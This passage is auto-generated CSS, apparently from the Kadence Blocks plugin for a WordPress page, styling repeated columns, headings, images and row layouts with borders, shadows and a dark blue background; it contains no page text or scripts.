.kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_09c68d-e1 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_09c68d-e1 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_09c68d-e1 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_09c68d-e1 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_09c68d-e1, .kt-inside-inner-col > .kadence-column76_09c68d-e1:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_09c68d-e1 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_09c68d-e1 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_34bb52-b2 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_34bb52-b2 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_34bb52-b2 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_34bb52-b2 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_34bb52-b2 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_34bb52-b2, .kt-inside-inner-col > .kadence-column76_34bb52-b2:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_34bb52-b2 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_34bb52-b2 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_a30baa-a2, .wp-block-kadence-advancedheading.kt-adv-heading76_a30baa-a2[data-kb-block="kb-adv-heading76_a30baa-a2"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_a30baa-a2 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_a30baa-a2[data-kb-block="kb-adv-heading76_a30baa-a2"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_a30baa-a2 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_a30baa-a2[data-kb-block="kb-adv-heading76_a30baa-a2"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_a30baa-a2, .wp-block-kadence-advancedheading.kt-adv-heading76_a30baa-a2[data-kb-block="kb-adv-heading76_a30baa-a2"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_f14cdc-1b:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_f14cdc-1b .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_f14cdc-1b img.kb-img, .kb-image76_f14cdc-1b .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_f14cdc-1b img.kb-img, .kb-image76_f14cdc-1b .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_f14cdc-1b.kb-image-is-ratio-size, .kb-image76_f14cdc-1b .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_f14cdc-1b figure{max-width:150px;}.kb-image76_f14cdc-1b img.kb-img, .kb-image76_f14cdc-1b .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_f5ef34-f4 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_f5ef34-f4 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_40aeb2-9f > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_40aeb2-9f > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_40aeb2-9f > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_40aeb2-9f > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_40aeb2-9f > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_40aeb2-9f, .kt-inside-inner-col > .kadence-column76_40aeb2-9f:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_40aeb2-9f > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_40aeb2-9f > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_d24537-65 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_d24537-65 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_d24537-65 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_d24537-65 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_d24537-65 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_d24537-65, .kt-inside-inner-col > .kadence-column76_d24537-65:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_d24537-65 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_d24537-65 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_4c94d5-b8, .wp-block-kadence-advancedheading.kt-adv-heading76_4c94d5-b8[data-kb-block="kb-adv-heading76_4c94d5-b8"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_4c94d5-b8 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_4c94d5-b8[data-kb-block="kb-adv-heading76_4c94d5-b8"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_4c94d5-b8 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_4c94d5-b8[data-kb-block="kb-adv-heading76_4c94d5-b8"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_4c94d5-b8, .wp-block-kadence-advancedheading.kt-adv-heading76_4c94d5-b8[data-kb-block="kb-adv-heading76_4c94d5-b8"]{font-size:22px;}}.kb-row-layout-id76_b66fde-f1 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_b66fde-f1 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_7539b8-f9 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_7539b8-f9 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_7539b8-f9 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_7539b8-f9 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_7539b8-f9 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_7539b8-f9, .kt-inside-inner-col > .kadence-column76_7539b8-f9:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_7539b8-f9 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_7539b8-f9 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_310195-40 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_310195-40 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_310195-40 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_310195-40 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_310195-40 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_310195-40, .kt-inside-inner-col > .kadence-column76_310195-40:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_310195-40 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_310195-40 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_e61e56-d9, .wp-block-kadence-advancedheading.kt-adv-heading76_e61e56-d9[data-kb-block="kb-adv-heading76_e61e56-d9"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_e61e56-d9 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_e61e56-d9[data-kb-block="kb-adv-heading76_e61e56-d9"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_e61e56-d9 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_e61e56-d9[data-kb-block="kb-adv-heading76_e61e56-d9"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_e61e56-d9, .wp-block-kadence-advancedheading.kt-adv-heading76_e61e56-d9[data-kb-block="kb-adv-heading76_e61e56-d9"]{font-size:22px;}}.kb-row-layout-id76_c89cb2-84 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_c89cb2-84 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_a346be-94 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_a346be-94 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_a346be-94 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_a346be-94 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_a346be-94 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_a346be-94, .kt-inside-inner-col > .kadence-column76_a346be-94:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_a346be-94 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_a346be-94 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_54af5c-94 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_54af5c-94 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_54af5c-94 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_54af5c-94 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_54af5c-94 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_54af5c-94, .kt-inside-inner-col > .kadence-column76_54af5c-94:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_54af5c-94 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_54af5c-94 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_f1870c-19, .wp-block-kadence-advancedheading.kt-adv-heading76_f1870c-19[data-kb-block="kb-adv-heading76_f1870c-19"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_f1870c-19 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_f1870c-19[data-kb-block="kb-adv-heading76_f1870c-19"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_f1870c-19 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_f1870c-19[data-kb-block="kb-adv-heading76_f1870c-19"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_f1870c-19, .wp-block-kadence-advancedheading.kt-adv-heading76_f1870c-19[data-kb-block="kb-adv-heading76_f1870c-19"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_78e6aa-e6:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_78e6aa-e6 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_78e6aa-e6 img.kb-img, .kb-image76_78e6aa-e6 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_78e6aa-e6 img.kb-img, .kb-image76_78e6aa-e6 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_78e6aa-e6.kb-image-is-ratio-size, .kb-image76_78e6aa-e6 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_78e6aa-e6 figure{max-width:150px;}.kb-image76_78e6aa-e6 img.kb-img, .kb-image76_78e6aa-e6 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_c1e4bc-de > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_c1e4bc-de > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_5cafbd-14 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_5cafbd-14 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_5cafbd-14 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_5cafbd-14 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_5cafbd-14 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_5cafbd-14, .kt-inside-inner-col > .kadence-column76_5cafbd-14:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_5cafbd-14 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_5cafbd-14 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_ad9d50-e5 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_ad9d50-e5 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_ad9d50-e5 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_ad9d50-e5 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_ad9d50-e5 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_ad9d50-e5, .kt-inside-inner-col > .kadence-column76_ad9d50-e5:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_ad9d50-e5 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_ad9d50-e5 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_37c1e3-92, .wp-block-kadence-advancedheading.kt-adv-heading76_37c1e3-92[data-kb-block="kb-adv-heading76_37c1e3-92"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_37c1e3-92 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_37c1e3-92[data-kb-block="kb-adv-heading76_37c1e3-92"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_37c1e3-92 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_37c1e3-92[data-kb-block="kb-adv-heading76_37c1e3-92"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_37c1e3-92, .wp-block-kadence-advancedheading.kt-adv-heading76_37c1e3-92[data-kb-block="kb-adv-heading76_37c1e3-92"]{font-size:22px;}}.kb-row-layout-id76_041396-57 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_041396-57 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_ed98ae-14 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_ed98ae-14 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_ed98ae-14 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_ed98ae-14 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_ed98ae-14 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_ed98ae-14, .kt-inside-inner-col > .kadence-column76_ed98ae-14:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_ed98ae-14 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_ed98ae-14 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_76e958-ad > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_76e958-ad > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_76e958-ad > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_76e958-ad > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_76e958-ad > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_76e958-ad, .kt-inside-inner-col > .kadence-column76_76e958-ad:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_76e958-ad > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_76e958-ad > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_8efa4b-ec, .wp-block-kadence-advancedheading.kt-adv-heading76_8efa4b-ec[data-kb-block="kb-adv-heading76_8efa4b-ec"]{padding-bottom:2px;text-align:center;font-size:20px;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_8efa4b-ec mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_8efa4b-ec[data-kb-block="kb-adv-heading76_8efa4b-ec"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_8efa4b-ec img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_8efa4b-ec[data-kb-block="kb-adv-heading76_8efa4b-ec"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_8efa4b-ec, .wp-block-kadence-advancedheading.kt-adv-heading76_8efa4b-ec[data-kb-block="kb-adv-heading76_8efa4b-ec"]{font-size:22px;}}.kb-row-layout-id76_ac2258-d6 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_ac2258-d6 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_160125-d6 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_160125-d6 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_160125-d6 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_160125-d6 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_160125-d6 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_160125-d6, .kt-inside-inner-col > .kadence-column76_160125-d6:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_160125-d6 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_160125-d6 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_e6a471-50 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_e6a471-50 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_e6a471-50 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_e6a471-50 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_e6a471-50 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_e6a471-50, .kt-inside-inner-col > .kadence-column76_e6a471-50:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_e6a471-50 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_e6a471-50 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_da84a4-4a, .wp-block-kadence-advancedheading.kt-adv-heading76_da84a4-4a[data-kb-block="kb-adv-heading76_da84a4-4a"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_da84a4-4a mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_da84a4-4a[data-kb-block="kb-adv-heading76_da84a4-4a"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_da84a4-4a img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_da84a4-4a[data-kb-block="kb-adv-heading76_da84a4-4a"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_da84a4-4a, .wp-block-kadence-advancedheading.kt-adv-heading76_da84a4-4a[data-kb-block="kb-adv-heading76_da84a4-4a"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_17cb61-e2:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_17cb61-e2 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_17cb61-e2 img.kb-img, .kb-image76_17cb61-e2 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_17cb61-e2 img.kb-img, .kb-image76_17cb61-e2 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_17cb61-e2.kb-image-is-ratio-size, .kb-image76_17cb61-e2 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_17cb61-e2 figure{max-width:150px;}.kb-image76_17cb61-e2 img.kb-img, .kb-image76_17cb61-e2 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_a9b2fe-08 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_a9b2fe-08 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_f85f28-89 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_f85f28-89 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_f85f28-89 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_f85f28-89 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_f85f28-89 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_f85f28-89, .kt-inside-inner-col > .kadence-column76_f85f28-89:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_f85f28-89 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_f85f28-89 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_aac556-2d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_aac556-2d > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_aac556-2d > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_aac556-2d > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_aac556-2d > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_aac556-2d, .kt-inside-inner-col > .kadence-column76_aac556-2d:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_aac556-2d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_aac556-2d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_64ac80-bd, .wp-block-kadence-advancedheading.kt-adv-heading76_64ac80-bd[data-kb-block="kb-adv-heading76_64ac80-bd"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_64ac80-bd mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_64ac80-bd[data-kb-block="kb-adv-heading76_64ac80-bd"] 